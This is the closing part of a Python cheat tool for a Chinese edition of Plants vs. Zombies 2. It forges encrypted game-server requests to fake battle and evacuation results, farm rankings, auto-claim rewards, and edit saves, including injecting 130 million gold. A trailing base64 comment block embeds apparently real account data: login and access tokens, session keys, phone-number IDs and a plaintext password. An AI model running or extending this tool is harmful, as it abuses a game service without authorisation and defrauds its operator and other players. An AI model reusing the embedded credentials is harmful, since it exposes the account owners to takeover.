                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                pl_after = {}
                for item in _find_pl(decrypted_json):
                    try:
                        pl_after[str(item['i'])] = int(item['s'])
                    except:
                        pass

                shengjie_count = 0
                for plant_id, after_level in pl_after.items():
                    before_level = pl_before.get(plant_id, 0)
                    if after_level > before_level:
                        plant_info = formatted_plant.get(plant_id, {"name": f"未知植物({plant_id})", "pinzhi": "default"})
                        plant_name = plant_info["name"]
                        plant_pinzhi = plant_info["pinzhi"]
                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                        print(f"  {color_code}{plant_name}{C.R} {before_level}阶→{after_level}阶")
                        shengjie_count += 1
                if shengjie_count == 0:
                    print("  暂无可升阶植物")
                else:
                    print(f"  共升阶 {shengjie_count} 次")
            except Exception as e:
                print(f"植物升阶出错: {e}")

            try:
                pi, ui, sk = session.pi, session.ui, session.sk
                is_ios = (session.platform == "ios")
                req_code = "V216" if is_ios else "V316"
                data = {"req": req_code, "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)

                def _find_zb_data(node):
                    stack = [node]
                    while stack:
                        current = stack.pop()
                        if isinstance(current, dict):
                            if all(k in current for k in ("dcl", "ndcl", "dl", "ndl")):
                                return current.get("dcl", []), current.get("ndcl", []), current.get("dl", []), current.get("ndl", [])
                            for v in current.values():
                                if isinstance(v, (dict, list)):
                                    stack.append(v)
                        elif isinstance(current, list):
                            for item in current:
                                if isinstance(item, (dict, list)):
                                    stack.append(item)
                    return None

                zb_data = _find_zb_data(decrypted_json)
                if zb_data is None:
                    print("  未找到装扮数据")
                else:
                    dcl, ndcl, dl, ndl = zb_data

                    def _avatar_to_shard(num):
                        if num < 2100:
                            return num + 100
                        elif 100000 < num < 190000:
                            return num + 100
                        elif 199999 < num < 1000000:
                            return num * 10 + 20000000
                        else:
                            return num

                    def _shard_to_avatar(num):
                        if num < 2100:
                            return num - 100
                        elif 100000 < num < 190000:
                            return num - 100
                        elif 199999 < num < 1000000:
                            return (num - 20000000) // 10
                        else:
                            return num

                    owned_shard_ids = set()
                    for num in dl + ndl:
                        try:
                            owned_shard_ids.add(str(_avatar_to_shard(int(num))))
                        except:
                            pass

                    unowned_shard_counts = {}
                    for item in dcl + ndcl:
                        try:
                            sid = str(item.get("i", ""))
                            qty = int(item.get("q", 0))
                            if sid and sid not in owned_shard_ids and qty > 0:
                                unowned_shard_counts[sid] = unowned_shard_counts.get(sid, 0) + qty
                        except:
                            pass

                    zhuangban_count = 0
                    for shard_id, shard_count in list(unowned_shard_counts.items()):
                        if shard_count < 30:
                            continue
                        try:
                            iid = int(shard_id)
                            nid = _shard_to_avatar(iid)
                            zhuangban_info = formatted_plant.get(str(nid), {"name": f"未知装扮({nid})", "pinzhi": "default"})
                            zhuangban_name = zhuangban_info["name"]
                            zhuangban_pinzhi = zhuangban_info["pinzhi"]
                            color_code = pinzhi_to_color.get(zhuangban_pinzhi, pinzhi_to_color["default"])

                            d797 = {"req": "V797", "e": {"di": nid, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                            ed7, hd7 = get_encrypted_data(d797, url)
                            r797 = _do_post(hd7, ed7, d797)
                            rd797 = json.loads(r797.text)
                            r_code = rd797.get("r")
                            if r_code == 0:
                                print(f"  {color_code}{zhuangban_name}{C.R} 合成成功")
                                zhuangban_count += 1
                            elif r_code in (45041, 45042, 10201, 20013):
                                pass
                            elif r_code != 20024:
                                print(f"  {color_code}{zhuangban_name}{C.R} 合成失败(r={r_code})")
                        except Exception as e:
                            continue

                    if zhuangban_count == 0:
                        print("  暂无可合成装扮")
                    else:
                        print(f"  共合成 {zhuangban_count} 个装扮")
            except Exception as e:
                print(f"装扮合成出错: {e}")
        else:
            print("已跳过植物升阶和装扮合成")

    except KeyError as _e:
        print(f"{C.Y}一键日常响应解析出错: {_e}，跳过{C.R}")
def daifubei():
    pi, ui, sk = get_pi_sk(加密)
    while True:
        data = {"req":"V303","e":{"al":[{"id":10908,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}

        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        if "e" not in decrypted_json or "d" not in decrypted_json.get("e", {}):
            print(f"戴夫杯请求失败：{decrypted_json.get('error', decrypted_response.text)}")
            return

        op_value = decrypted_json["e"]["d"][0].get("op")

        if op_value == 0 or op_value is None:
            print("活动未开启")
            return

        elif op_value == 1:
            parsed_data = json.loads(decrypted_json['e']['d'][0]['data'])
            unlockedLevel = parsed_data['unlockedLevel']
            milestoneLevel = parsed_data['milestoneLevel']

            print(f"当前等级{milestoneLevel}，最大等级{unlockedLevel}")

            if int(milestoneLevel) >= int(unlockedLevel):
                print(f"已达现阶段最高等级{unlockedLevel}")
                data = {"req":"V1316","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("已领取等级奖励")
                return

            data = {"req":"V1310","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("开始匹配成功")

                need_back_to_v303 = False

                while True:
                    data = {"req":"V1311","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}

                    encrypted_data, head = get_encrypted_data(data, url)
                    time.sleep(0.3)
                    response = _do_post(head, encrypted_data, data)

                    response_data = json.loads(response.text)

                    if response_data.get("r") == 0:
                        decrypted_response = requests.post(er_url, data=response)
                        decrypted_json = json.loads(decrypted_response)

                        e_data = decrypted_json.get('e', {})
                        d_data = e_data.get('d', {})

                        status = d_data.get('status')
                        room_id = d_data.get('roomId', '')

                        print(f"匹配状态：{status}")

                        if status == 2 and room_id:
                            print(f"戴夫杯匹配成功，房间ID：{room_id}")

                            tim = 0
                            v1315_done_rounds = set()
                            data_list = []
                            for i in range(1000):
                                data = {"req":"V1313","e":{"pi":pi,"ri":room_id,"sk":sk,"ui":ui},"ev":3}
                                data_str = json.dumps(data)
                                data_list.append(data_str)
                                i += 1
                            data = ''.join(data_list)
                            encrypted_data = requests.post(tx_url, data)
                            enc_list = json.loads(encrypted_data.text)
                            session = requests.Session()
                            index = 0
                            tim = 0
                            while True:
                                text_data = enc_list[index]
                                response = session.post(and_url, headers=head, data=text_data, timeout=5)
                                time.sleep(1)
                                tim += 1
                                response_text = response.text
                                lines = [line.strip() for line in response_text.split('\n') if line.strip()]
                                json_line = None
                                for line in reversed(lines):
                                    if line.startswith('{'):
                                        json_line = line
                                        break
                                response_data = json.loads(json_line)
                                if response_data.get("r") == 0:
                                    if tim % 5 != 0:
                                        index += 1
                                        continue
                                    decrypted_response = requests.post(er_url, data=response.text)
                                    decrypted_json = json.loads(decrypted_response)
                                    status = decrypted_json['e']['d']['status']
                                    current_round = decrypted_json['e']['d']['round']
                                    if int(status) == 3:
                                        if current_round not in v1315_done_rounds:
                                            v1315_done_rounds.add(current_round)
                                            data = {"req":"V1315","e":{"hs":"","pi":pi,"rd":current_round,"ri":room_id,"sk":sk,"ui":ui,"wn":"2"},"ev":3}
                                            encrypted_data, head = get_encrypted_data(data, url)
                                            response = _do_post(head, encrypted_data, data)
                                            response_data = json.loads(response.text)
                                            if response_data.get("r") == 0:
                                                print("状态上传成功")
                                    print(f"对局正在进行中，已耗时{tim}，当前对局{current_round}，阶段{status}")

                                    if int(status) == 5 and int(current_round) == 8:

                                        need_back_to_v303 = True
                                        break
                                index += 1

                            if need_back_to_v303:
                                break

                if need_back_to_v303:
                    continue
def soudache():
    pi, ui, sk = get_pi_sk(加密)
    zw_list = [{"t":1,"q":4,"c":1,"id":111035,"iid":"0","star":3},{"t":1,"q":4,"c":1,"id":111067,"iid":"0","star":3},{"t":1,"q":4,"c":1,"id":200128,"iid":"0","star":3},{"t":1,"q":4,"c":1,"id":200046,"iid":"0","star":3}]
    data = {"req":"V303","e":{"al":[{"id":10910,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("搜打撤刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json['e']['d'][0].get('op')
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data_str = json.loads(decrypted_json['e']['d'][0]['data'])
            all_dicts = []
            for item in data_str["collection"]:

                LV_MAP = {0: 0, 1: 1, 2: 2, 3: 4, 4: 7, 5: 10}
                lvl = item.get("lvl", 0)
                stock = item.get("stock", 0)
                lv = LV_MAP.get(lvl, 0)
                if lvl == 5:
                    repeat = 10 - lv
                else:
                    repeat = 10 - (lv + stock)
                if repeat <= 0:
                    continue
                base = {"t": 3,"q": item["q"],"c": 1,"id": int(item["id"]),"iid": "0","star": 1}
                for _ in range(repeat):
                    all_dicts.append(dict(base))
            random.shuffle(all_dicts)
            nd_list = []
            for i in range(0, len(all_dicts),  4):
                nd_list.append(all_dicts[i:i+4])
            for cl_list in nd_list:
                data = {"req":"V1320","e":{"diff_level":"1","pi":pi,"sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("选择难度成功")
                    decrypted_response = get_decrypted_data(url, data=response)
                    decrypted_json = json.loads(decrypted_response)
                    battle_token = decrypted_json["e"]["d"]["battle_token"]
                    data = {"req":"V1324","e":{"battle_token":battle_token,"collection_index":"1","pi":pi,"sk":sk,"ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 0:
                        print("选择队伍成功")
                        gq_list = [{"req":"V1322","e":{"backpack":cl_list,"battle_token":battle_token,"coin_num":"0","level_info":{"current_node":1,"stage_map_ids":[3,2,1],"board_objects":[],"warehouse_objects":cl_list,"stability":100,"abyss_eye_layer":0},"node":"1","pi":pi,"sk":sk,"ui":ui},"ev":3},{"req":"V1322","e":{"backpack":cl_list,"battle_token":battle_token,"coin_num":"4","level_info":{"current_node":2,"stage_map_ids":[3,2,1],"board_objects":[{"t":1,"id":200068,"grid_loc":{"mX":0,"mY":1},"star_level":1,"rare":0,"rand_id":"0","energy":100.0},{"t":1,"id":1001,"grid_loc":{"mX":0,"mY":2},"star_level":1,"rare":0,"rand_id":"0","energy":100.0},{"t":1,"id":200086,"grid_loc":{"mX":0,"mY":3},"star_level":1,"rare":1,"rand_id":"0","energy":100.0},{"t":1,"id":111042,"grid_loc":{"mX":1,"mY":2},"star_level":1,"rare":3,"rand_id":"0","energy":53.0},{"t":1,"id":200068,"grid_loc":{"mX":1,"mY":3},"star_level":1,"rare":0,"rand_id":"0","energy":50.0}],"warehouse_objects":cl_list,"stability":100,"abyss_eye_layer":20},"node":"2","pi":pi,"sk":sk,"ui":ui},"ev":3}]
                        for item in gq_list:
                            encrypted_data, head = get_encrypted_data(item, url)
                            time.sleep(5)
                            response = _do_post(head, encrypted_data, data)
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("关卡通过成功")
                        data = {"req":"V1323","e":{"battle_token":battle_token,"loot":cl_list,"pi":pi,"result_type":"3","sk":sk,"ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("撤离成功")
                            for item in cl_list:
                                i_value = str(item['id'])
                                plant_info = formatted_plant.get(
                                    i_value,
                                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                )
                                plant_name = plant_info["name"]
                                plant_pinzhi = plant_info["pinzhi"]
                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}")
                        else:
                            print("撤离异常")
            for i in range(10):
                data = {"req":"V1320","e":{"diff_level":"1","pi":pi,"sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("选择难度成功")
                    decrypted_response = get_decrypted_data(url, data=response)
                    decrypted_json = json.loads(decrypted_response)
                    battle_token = decrypted_json["e"]["d"]["battle_token"]
                    data = {"req":"V1324","e":{"battle_token":battle_token,"collection_index":"1","pi":pi,"sk":sk,"ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 0:
                        print("选择队伍成功")
                        gq_list = [{"req":"V1322","e":{"backpack":zw_list,"battle_token":battle_token,"coin_num":"0","level_info":{"current_node":1,"stage_map_ids":[3,2,1],"board_objects":[],"warehouse_objects":zw_list,"stability":100,"abyss_eye_layer":0},"node":"1","pi":pi,"sk":sk,"ui":ui},"ev":3},{"req":"V1322","e":{"backpack":zw_list,"battle_token":battle_token,"coin_num":"4","level_info":{"current_node":2,"stage_map_ids":[3,2,1],"board_objects":[{"t":1,"id":200068,"grid_loc":{"mX":0,"mY":1},"star_level":1,"rare":0,"rand_id":"0","energy":100.0},{"t":1,"id":1001,"grid_loc":{"mX":0,"mY":2},"star_level":1,"rare":0,"rand_id":"0","energy":100.0},{"t":1,"id":200086,"grid_loc":{"mX":0,"mY":3},"star_level":1,"rare":1,"rand_id":"0","energy":100.0},{"t":1,"id":111042,"grid_loc":{"mX":1,"mY":2},"star_level":1,"rare":3,"rand_id":"0","energy":53.0},{"t":1,"id":200068,"grid_loc":{"mX":1,"mY":3},"star_level":1,"rare":0,"rand_id":"0","energy":50.0}],"warehouse_objects":zw_list,"stability":100,"abyss_eye_layer":20},"node":"2","pi":pi,"sk":sk,"ui":ui},"ev":3}]
                        for item in gq_list:
                            encrypted_data, head = get_encrypted_data(item, url)
                            time.sleep(5)
                            response = _do_post(head, encrypted_data, data)
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 0:
                                print("关卡通过成功")
                        data = {"req":"V1323","e":{"battle_token":battle_token,"loot":zw_list,"pi":pi,"result_type":"3","sk":sk,"ui":ui},"ev":3}

                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("撤离成功")
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            crystal_dust_total = decrypted_json['e']['d'].get('crystal_dust_total')
                        else:
                            print("撤离异常")
            crystal_dust = crystal_dust_total
            print(f"当前时空晶尘数量: {crystal_dust}")
            zl_list = [
                item["k"]
                for item in data_str["locker_status"]["total_reward_status"]
                if item["status"] == 1
            ]
            dj_list = [
                item["k"]
                for item in data_str["locker_status"]["level_reward_status"]
                if item["status"] == 1
            ]
            for mt in zl_list:
                data = {"req":"V1327","e":{"milestone":mt,"pi":pi,"reward_type":"1","sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                r_value = decrypted_json.get('r', None)
                if r_value != 0:
                    print("图鉴奖励领取失败")
                else:
                    print("图鉴奖励领取成功")
            for mt in dj_list:
                data = {"req":"V1327","e":{"milestone":mt,"pi":pi,"reward_type":"2","sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                r_value = decrypted_json.get('r', None)
                if r_value != 0:
                    print("等级奖励领取失败")
                else:
                    print("等级奖励领取成功")

def _ding_dibao():
    if jiazujiance(): run_fortieth_first_script()
def _ding_shuafen():
    if jiazujiance(): run_eightieth_fourth_script()
def _ding_nianshou():
    if jiazujiance(): nianshoushuashang()
def _daily_daily():
    ch = input("是否跳过碎片挑战和普通转盘(回车继续，输入1跳过)\n").strip()
    if ch == "": tuoz(); run_first_script()
    else: run_first_script()
def _yijian_all():
    tuoz(); sptuoz(); run_first_script(); run_ninth_script(); yijian()
def _yijian_skip():
    run_first_script(); run_ninth_script(); yijian()

def _auto_register():
    mapping = [

        ("daily", _daily_daily, "部分日常", False),
        ("daily",  sptuoz,                 "植物探险",                     False),
        ("daily",  run_third_script,       "超Z排行榜",                False),
        ("daily",  run_ninth_script,       "每月签到全领",                 False),
        ("daily",  run_eightieth_ninth_script, "兑换码领取",              False),
        ("daily",  run_nintieth_script,    "秘宝抽奖(需消耗钻石)",             False),
        ("daily",  run_nineteenth_script,  "查看存档信息",           False),

        ("one_time", run_thirtieth_second_script, "世界关卡钻石提前领取", False),
        ("one_time", run_thirtieth_fifth_script,  "治愈/投罐/章鱼三神器领取", False),
        ("one_time", run_seventieth_first_script, "世界困难模式植物装扮领取", False),
        ("one_time", run_seventieth_second_script,"世界解锁植物领取",    False),
        ("one_time", run_seventieth_third_script, "原木世界任务全领取",  False),
        ("one_time", run_eightieth_third_script,  "植物图鉴钻石顺序领取", False),
        ("one_time", run_nintieth_first_script,   "星星兑换植物和装扮", False),
        ("one_time", run_nintieth_third_script,   "查看游戏天数并领奖", False),

        ("pvp",    run_fourth_script,      "双人宗师",                     False),
        ("pvp",    run_twelfth_script,     "双人周任务提前领",             False),
        ("pvp",    run_fortieth_third_script, "双人排位奖励领取",         False),
        ("pvp",    run_sixtieth_fourth_script, "双人僵尸激活升阶",       False),
        ("pvp",    run_sixtieth_fifth_script,  "基因一键抽取升级",        False),
        ("pvp",    run_sixtieth_seventh_script,"双人胜败信息查看",        False),
        ("pvp",    run_nintieth_second_script,  "双人转盘一键抽取",        False),

        ("memory", run_fifth_script,       "回忆之旅一键",                 False),
        ("memory", run_fiftieth_script,    "回忆成就领取",                 False),
        ("memory", run_seventieth_ninth_script, "回忆商店购买",           False),
        ("memory", huiyixiaoyouxi,         "回忆小游戏全通",               False),
        ("memory", huiyixiaoyouxichengjiu, "回忆小游戏成就领取",           False),

        ("chase",  run_sixth_script,       "追击刷14w分并领取每周七百钻石", False),
        ("chase",  run_buy_battery,        "钻石购买电池",                   False),
        ("chase",  run_eighth_script,      "零分刷僵王",                   False),
        ("chase",  run_twenty_seventh_script, "潘追任务奖励领取",        False),
        ("chase",  run_twenty_eighth_script,  "查看追击排名",          False),
        ("chase",  run_seventieth_sixth_script,  "追击商店购买",         False),

        ("endless", run_fourteenth_script,      "刷无尽分",              False),
        ("endless", run_thirtieth_ninth_script, "刷无尽币",              False),
        ("endless", run_thirtieth_third_script, "无尽币查询",            False),
        ("endless", run_fifteenth_script,       "无尽挑战每日广告重置",  False),
        ("endless", run_fortieth_script,        "无尽商店循环购买",      False),
        ("endless", run_seventieth_script,      "无尽周任务领取",        False),

        ("secret", run_tenth_script,       "黄瓜森林第一章",              False),
        ("secret", run_eleventh_script,    "黄瓜森林第二章",              False),
        ("secret", run_eightieth_eighth_script, "周年秘境满星领取",     False),
        ("secret", run_nintieth_sixth_script,   "Z公司秘境一键领取",     False),
        ("secret", pingxingyuzhou,         "地宫秘境1",                   False),
        ("secret", pingxingyuzhou_2,       "地宫秘境2",                   False),

        ("garden", run_sixtieth_first_script, "查看已创建关卡并删除",    False),
        ("garden", run_garden_like,           "庭院点赞(循环)",          False),
        ("garden", run_seventieth_eighth_script, "庭院商店购买",         False),

        ("jubaopen", run_seventeen_script,       "聚宝盆币子经验领取",   True),
        ("jubaopen", run_eightieth_first_script, "聚宝盆商店购买",       False),

        ("zhaguan", run_zhaguan_task, "砸罐任务领取",             False),
        ("zhaguan", run_zhaguan, "砸罐",                         False),

        ("wanhui", run_fortieth_seventh_script, "大作战通用领任务",     True),

        ("taotuo", run_sixtieth_script,        "僵局逃脱一键通关领奖", False),

        ("tongyou", run_fortieth_eighth_script, "同游任务领取",         False),
        ("tongyou", run_eightieth_script,       "同游商店购买",         False),

        ("dingding", _ding_dibao,      "响叮当一键低保",        False),
        ("dingding", _ding_shuafen,     "响叮当自主排名刷分",    False),
        ("dingding", run_eightieth_seventh_script, "僵尸清除计划领奖", False),
        ("dingding", _ding_nianshou,    "年兽刷伤",              False),

                ("limited", run_sixteenth_script,       "戴夫厨房每日60钻",     True),
                        ("limited", run_twenty_sixth_script,    "破罐大师领取",         True),
                ("limited", run_thirtieth_first_script, "戴夫宝藏领取",         True),
        ("limited", run_fortieth_second_script, "圣诞袜领取抽光",       False),
                ("limited", run_seventieth_fifth_script,"问卷调查奖励领取",     False),
        ("limited", run_seventieth_seventh_script,"红水晶商店购买",     False),
                ("limited", run_eightieth_fifth_script, "欢乐购购买",           False),
                        ("limited", run_twenty_ninth_script,    "七日指南领取",         False),
        ("limited", run_nintieth_ninth_script,  "超装活动领币抽奖",     False),
        ("limited", xinyuantuangou,             "心愿团购投票",         False),
        ("limited", zhishiwenda,                "知识问答领取",         False),

        ("family", run_twenty_third_script,  "刷家族数值",                 False),
        ("family", run_fortieth_ninth_script, "刷家族具体词条数值",         False),
        ("family", jiazujiance,              "家族数值自查",               False),

        ("transgene", run_thirtieth_sixth_script, "植物碎片转基因",     False),
        ("transgene", run_fortieth_fourth_script, "植物一键激活升阶",  False),
        ("transgene", run_sixtieth_sixth_script,  "装扮激活并转基因",  False),

        ("save", run_fiftieth_one_script,    "消除虚拟植物/碎片/道具/挂件", False),
        ("save", run_fiftieth_second_script, "注入超级挂件",               False),
        ("save", run_fiftieth_fourth_script, "满星通关(无奖励)",           False),
        ("save", run_fiftieth_fifth_script,  "开启豌豆共生(需无一阶)",     False),
                ("save", run_fiftieth_seventh_script,"注入1.3亿金币",              False),
                        ("save", run_sixtieth_second_script, "强制修改黄瓜为30根",         False),

        ("lingying", run_eighteenth_script,  "令营未领取任务全领取",       False),
        ("lingying", lingyingzhuanpan,       "令营转盘领取",               False),

        ("yijian", _yijian_all, "一键日常(含碎片/探险)", False),
        ("yijian", _yijian_skip, "一键日常(跳过碎片/探险)", False),
    ]

    for cat, fn, name, yj in mapping:
        register(cat, name, yj)(fn)

_auto_register()
if __name__ == "__main__":

    main_entry()

# ===PVZ2_ACCOUNTS===
# W3siaWQiOiAxLCAibmFtZSI6ICI0Mzk5LTkxNjY1NTI5NCjmi5Pnu7QyNjEzNDA2NzEpIiwgInVpIjog
# IjkxNjY1NTI5NCIsICJwbGF0Zm9ybSI6ICLlronljZMiLCAibmlja25hbWUiOiAi54mi5aSn6LaF54eD
# 6IKY5Ye7IiwgImNmZyI6IHsiY29kZSI6ICIwMDAwIiwgImNvbnRlbnQiOiAie1wiY2hhbm5lbFVzZXJJ
# bmZvXCI6e1wiY2hhbm5lbFVzZXJJZFwiOlwiMTMxMzM2NjEwOFwiLFwibG9naW5Ub2tlblwiOlwiMTMx
# MzM2NjEwOHw0YTg1YzhlNGE1NjFhZjI5ODI1MzMwNzk1YmVlOTU0MHw0NjYxOXwyMDI2MDcyMjEwNDM0
# OWUyYzRmOTRiYjIzMWYxY2Y3YmIyMmEwZTk2NWYyYzQyMDA1MDg4NTMyMTgzYmJkNHw3NGFjMDQ5NThm
# NjUxYjI4NDdlMmNmNGQ1MWM1MTY0YXwzZTNlZmFjZGM5NGRmZTUyYjkxYjRkMDdlNTI0YTZiN3wxNzg5
# ODM0Njc2fDQzOTlcIn0sXCJsb2dpbklkZW50aXR5XCI6XCIxMzEzMzY2MTA4XCIsXCJpZFwiOjI2MTM0
# MDY3LFwibmlja1wiOlwi5ouT57u0MjYxMzQwNjcxXCJ9In19LCB7ImlkIjogMiwgIm5hbWUiOiAiaU9T
# LTEyNTM4Mzk0MyIsICJ1aSI6ICIxMjUzODM5NDMiLCAicGxhdGZvcm0iOiAiaW9zIiwgIm5pY2tuYW1l
# IjogIui/qui/piIsICJjZmciOiB7ImtleSI6ICIxMDEwOCIsICJtZXNzYWdlIjogIjIwMjYtMDktMDQg
# MjI6MjE6NDh8MTAxMDh8aU9TfDgyNDBmNmMxOTkwMTNhOThjMmQ1ODE3NzNhMjdlYzEzXzEyNTM4Mzk0
# M182MHwyODM3MDQ5MDF8RDdFNzQzNjktNDQ1QS00RTdDLUFDOEUtNThERDE2REM5MTU0fEFwcFN0b3Jl
# fDIwMjYtMDQtMjggMjM6NTQ6NTl8NC4yLjIuMzk0fGlvc19kZWZhdWx0fDUifX0sIHsiaWQiOiAzLCAi
# bmFtZSI6ICJRUS03NDA4NzQ1MzAiLCAidWkiOiAiNzQwODc0NTMwIiwgInBsYXRmb3JtIjogIuWuieWN
# kyIsICJuaWNrbmFtZSI6ICLliJrnlLDmraYiLCAiY2ZnIjogeyJvaSI6ICJCNzk3MDc2MDYxQkEwQzI5
# QjkwNUQ1OEEzOUEzNjdGNyIsICJhY2Nlc3NfdG9rZW4iOiAiREU5MzQxNjMzMUM3MkIyNzk2MDU3MThF
# NzczQzNGQjEiLCAiY29kZSI6ICJRUSJ9fSwgeyJpZCI6IDQsICJuYW1lIjogIuWumOacjS0xNTI1MjM3
# NzUyMCIsICJ1aSI6ICI4MjI1NDkzNjIiLCAicGxhdGZvcm0iOiAi5a6J5Y2TIiwgIm5pY2tuYW1lIjog
# IueJouWkp+i2heeEtuiCmOWHuyIsICJjZmciOiB7ImNoYW5uZWxfaWQiOiAyMDgsICJjaGFubmVsU2Rr
# VmVyc2lvbiI6ICJkajIuMC00LjAuMCIsICJwdCI6IHsidXNlcmlkIjogIjE1MjUyMzc3NTIwIiwgInBh
# c3N3b3JkIjogImNoZW55aTIwMDRAIn19fSwgeyJpZCI6IDUsICJuYW1lIjogIuWwj+exsy03MzcyODkw
# MjMiLCAidWkiOiAiNzM3Mjg5MDIzIiwgInBsYXRmb3JtIjogIuWuieWNkyIsICJuaWNrbmFtZSI6ICJN
# ci5SaWdodCIsICJjZmciOiB7ImFjY291bnQiOiB7ImFjY291bnROYW1lIjogIum7mOiupOW4kOWPtyIs
# ICJhY2NvdW50VHJhZGVJbmZvIjogbnVsbCwgImFjdGlvbiI6IDAsICJhcHBBY2NvdW50SWQiOiAyMDIz
# MTAyMzAwMDk0MTgzLCAiZXJyTXNnIjogIiIsICJoYXNUcmFkZSI6IGZhbHNlLCAiaXNBZHVsdCI6IGZh
# bHNlLCAiaXNOZXdVc2VyIjogZmFsc2UsICJpc1JlYWxOYW1lIjogZmFsc2UsICJsYXN0TG9naW5UaW1l
# IjogMTc4OTE3NTcwOTg2MSwgIm5pY2tOYW1lIjogIuWwj+aEjyIsICJvcGVuSWRTd2l0Y2giOiBmYWxz
# ZSwgIm9wZW5JZHMiOiBbeyJhY2NvdW50TmFtZSI6ICLpu5jorqTluJDlj7ciLCAibGFzdExvZ2luVGlt
# ZSI6IDE3ODkxNzU3MTAwMDAsICJvcGVuSWQiOiAyMDIzMTAyMzAwMDk0MTgzLCAic3RhdHVzIjogMX1d
# LCAicmV0Q29kZSI6IDIwMCwgInJpc2tDb2RlIjogMCwgInJpc2tNc2ciOiBudWxsLCAic2VydmljZVRv
# a2VuIjogIntcInNlc3Npb25cIjpcIlI1b2pWMXlOU29NSUMyY1hcIixcImtleVwiOlwiTHBzZ3Y1MmFz
# S2IzV3Z3TFwiLFwidWlkXCI6MTQ1MDI1Njc4NyxcInRcIjoxNzg5MjI4OTU2NTQwLFwibmlja05hbWVc
# IjpudWxsLFwiYWtleVwiOlwiNEY0MjYyNTk3NzMwNjY2NDY3NDEzNzMxNDU2MTc4NEJcIixcImxhc3RD
# aGVja0F1dGhUaW1lXCI6MTc4OTIyODk1NjU0MCxcIm1pZFwiOjI2ODE3MTgyNzd9IiwgInNlc3Npb24i
# OiAiS3pOcHpVVGJLZWtSVjkzRSIsICJ1bmlvbklkIjogIiJ9LCAiZ2FtZSI6IHsiYXBwQWNjb3VudElk
# IjogMjAyMzEwMjMwMDA5NDE4MywgIm5pY2tOYW1lIjogIuWwj+aEjyIsICJvaSI6ICIyMDIzMTAyMzAw
# MDk0MTgzIiwgIm9wZW5JZCI6IDIwMjMxMDIzMDAwOTQxODMsICJzZXJ2aWNlVG9rZW4iOiAie1wic2Vz
# c2lvblwiOlwiUjVvalYxeU5Tb01JQzJjWFwiLFwia2V5XCI6XCJMcHNndjUyYXNLYjNXdndMXCIsXCJ1
# aWRcIjoxNDUwMjU2Nzg3LFwidFwiOjE3ODkyMjg5NTY1NDAsXCJuaWNrTmFtZVwiOm51bGwsXCJha2V5
# XCI6XCI0RjQyNjI1OTc3MzA2NjY0Njc0MTM3MzE0NTYxNzg0QlwiLFwibGFzdENoZWNrQXV0aFRpbWVc
# IjoxNzg5MjI4OTU2NTQwLFwibWlkXCI6MjY4MTcxODI3N30iLCAic2Vzc2lvbiI6ICJLek5welVUYktl
